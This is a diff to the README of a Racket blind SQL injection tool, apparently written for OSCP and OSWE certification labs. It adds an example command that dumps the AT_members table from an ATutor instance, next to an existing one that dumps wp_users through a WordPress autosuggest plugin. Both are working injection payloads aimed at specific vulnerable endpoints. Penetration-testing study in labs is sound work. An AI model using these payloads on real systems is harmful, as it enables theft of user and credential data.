@@ -35,4 +35,6 @@ This tool will be written in Racket, my favorite programming language.
     Private repository link: https://github.com/johnnyodonnell/notes-on-oscp-lab-machines/tree/master/10.1.1.246
 * Example command for 10.1.1.246 from the OSCP labs:\
     `racket blind-sql.rkt -d wordpress -t wp_users -s "<results>.+</results>" dump-table GET 10.11.1.251 /wp/wp-content/plugins/wp-autosuggest/autosuggest.php "wpas_action=query&wpas_keys=1'/**/OR/**/~a);#"`
+* Example command for ATutor from the OSWE labs:\
+    `racket blind-sql.rkt -d atutor -t AT_members -s "Offensive" dump-table GET 192.168.153.103 /ATutor/mods/_standard/social/index_public.php "q=' AND ~a);#"`
 
